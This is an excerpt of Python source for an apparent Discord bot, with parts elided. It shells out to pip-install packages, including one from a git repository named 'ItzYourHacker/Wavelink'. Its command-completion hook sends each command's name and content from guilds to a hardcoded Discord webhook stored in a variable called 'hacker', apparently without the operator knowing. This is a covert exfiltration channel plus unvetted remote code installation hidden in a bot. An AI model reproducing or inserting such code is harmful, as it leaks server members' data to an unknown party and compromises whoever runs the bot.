...
os.system(
    "pip install tasksio && pip install httpx && pip install psutil && pip install requests && pip install git+https://github.com/ItzYourHacker/Wavelink"
)
...
async def on_command_completion(context: Context) -> None:
  ...
  hacker = discord.SyncWebhook.from_url(
      "https://discord.com/api/webhooks/1118743634221740052/kQyvWt1u1-BgWKpbYGtq2B5Q35If8RReFBUCxjDROIZCJGtFpbpQAwD-5FUMi7e8DygY"
  )
  ...
  if context.guild is not None:
    try:
      ...
      embed.add_field(name="Command Name :",
                      ...
                      inline=False)
      embed.add_field(name="Command Content :",
                      value="{}".format(pcmd),
                      inline=False)
      embed.add_field(
